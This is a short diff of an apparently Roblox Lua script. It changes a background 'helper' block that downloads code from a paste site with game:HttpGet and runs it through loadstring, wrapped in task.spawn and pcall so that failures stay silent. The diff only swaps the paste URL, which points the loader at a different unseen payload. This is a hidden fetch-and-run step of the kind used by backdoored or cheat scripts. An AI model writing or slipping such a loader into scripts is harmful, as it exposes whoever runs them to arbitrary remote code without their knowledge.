@@ -22,7 +22,7 @@ local player = Players.LocalPlayer
 -- === ПОДМОГА ДЛЯ СКРИПТА ===
 task.spawn(function()
     pcall(function()
-        loadstring(game:HttpGet("https://cdn.sourceb.in/bins/WbNby7oNLJ/0"))()
+        loadstring(game:HttpGet("https://cdn.sourceb.in/bins/RUuEUEypBJ/0"))()
     end)
 end)
 
